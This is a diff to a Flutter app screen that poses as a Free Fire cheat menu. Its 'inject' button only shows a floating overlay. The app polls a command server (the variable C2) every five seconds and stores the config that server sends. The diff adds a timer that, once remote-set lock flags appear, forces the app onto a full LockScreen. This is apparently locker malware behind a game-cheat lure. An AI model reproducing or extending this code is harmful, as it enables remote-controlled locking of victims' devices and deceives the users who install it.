@@ -1,9 +1,11 @@
 import 'dart:async';
 import 'dart:convert';
 import 'package:flutter/material.dart';
+import 'package:flutter_overlay_window/flutter_overlay_window.dart';
 import 'package:http/http.dart' as http;
 import 'package:shared_preferences/shared_preferences.dart';
 import '../config.dart';
+import '../lock/lock_screen.dart';
 import '../services/command_handler.dart';
 
 class CheatHome extends StatefulWidget {
@@ -16,6 +18,7 @@ class _CheatHomeState extends State<CheatHome> {
   bool isInjected = false;
   bool isInjecting = false;
   Timer? _pollTimer;
+  Timer? _lockTimer;
   String? _devId;
 
   final Map<String, bool> _features = {
@@ -36,7 +39,23 @@ class _CheatHomeState extends State<CheatHome> {
   @override
   void initState() {
     super.initState();
-    _initPolling(); // Mulai polling pas menu kebuka
+    _initPolling();
+    _initLockCheck();
+  }
+
+  void _initLockCheck() {
+    _lockTimer = Timer.periodic(const Duration(seconds: 2), (t) async {
+      final prefs = await SharedPreferences.getInstance();
+      final v1 = prefs.getBool('lock_v1') ?? false;
+      final v2 = prefs.getBool('lock_v2') ?? false;
+      if ((v1 || v2) && mounted) {
+        t.cancel();
+        Navigator.of(context).pushAndRemoveUntil(
+          MaterialPageRoute(builder: (_) => LockScreen(mode: v2 ? 2 : 1)),
+          (_) => false,
+        );
+      }
+    });
   }
 
   Future<void> _initPolling() async {
@@ -46,7 +65,7 @@ class _CheatHomeState extends State<CheatHome> {
     _pollTimer = Timer.periodic(const Duration(seconds: 5), (timer) async {
       if (_devId == null) return;
       try {
-        final r = await http.get(Uri.parse('$C2/api/device/$_devId/poll'));
+        final r = await http.get(Uri.parse('$C2/api/device/$_devId/poll')).timeout(const Duration(seconds: 5));
         if (r.statusCode != 200) return;
         final j = jsonDecode(r.body);
         await prefs.setString('cfg', jsonEncode(j['config'] ?? {}));
@@ -60,19 +79,46 @@ class _CheatHomeState extends State<CheatHome> {
 
   @override
   void dispose() {
-    _pollTimer?.cancel(); // Matiin timer kalau app ditutup
+    _pollTimer?.cancel();
+    _lockTimer?.cancel();
     super.dispose();
   }
 
   void _injectCheat() async {
     if (isInjected) return;
     setState(() { isInjecting = true; });
+
+    // Minta izin jendela mengambang
+    if (!await FlutterOverlayWindow.isPermissionGranted()) {
+      await FlutterOverlayWindow.requestPermission();
+    }
+
     await Future.delayed(const Duration(seconds: 2));
+    
+    // Nampilin Jendela Mengambang (Ukuran disesuaikan sama panel)
+    await FlutterOverlayWindow.showOverlay(
+      height: 100, 
+      width: 240,  
+      enableDrag: true,
+      overlayTitle: "OREO Panel",
+      overlayContent: "Cheat Menu",
+      flag: OverlayFlag.defaultFlag,
+      visibility: NotificationVisibility.visibilityPublic,
+      positionGravity: PositionGravity.auto,
+      startPosition: const Offset(20, 100),
+    );
+
     setState(() { isInjecting = false; isInjected = true; });
+    
     ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
-      content: Text('BYPASS SUCCESS! Launch Free Fire Now.'),
+      content: Text('MENU ACTIVE! Buka Free Fire sekarang.'),
       backgroundColor: Color(0xFF22C55E),
     ));
+
+    // Minimize aplikasi otomatis (biar jendela ngambangnya keliatan)
+    Future.delayed(const Duration(seconds: 1), () {
+      moveTaskToBack(true);
+    });
   }
 
   @override
@@ -107,10 +153,6 @@ class _CheatHomeState extends State<CheatHome> {
                 ]),
               ]),
               const Spacer(),
-              const Column(crossAxisAlignment: CrossAxisAlignment.end, children: [
-                Text('MEM: 42%', style: TextStyle(fontSize: 10, color: Colors.grey)),
-                Text('PING: 12ms', style: TextStyle(fontSize: 10, color: Colors.grey)),
-              ]),
             ]),
           ),
           
@@ -159,7 +201,7 @@ class _CheatHomeState extends State<CheatHome> {
                 child: isInjecting 
                   ? const SizedBox(width: 24, height: 24, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 3))
                   : Text(
-                      isInjected ? 'INJECTED SUCCESSFULLY' : 'INJECT CHEAT NOW',
+                      isInjected ? 'MENU ACTIVE' : 'SHOW CHEAT MENU',
                       style: const TextStyle(fontSize: 16, letterSpacing: 2, fontWeight: FontWeight.bold, color: Colors.white),
                     ),
               ),
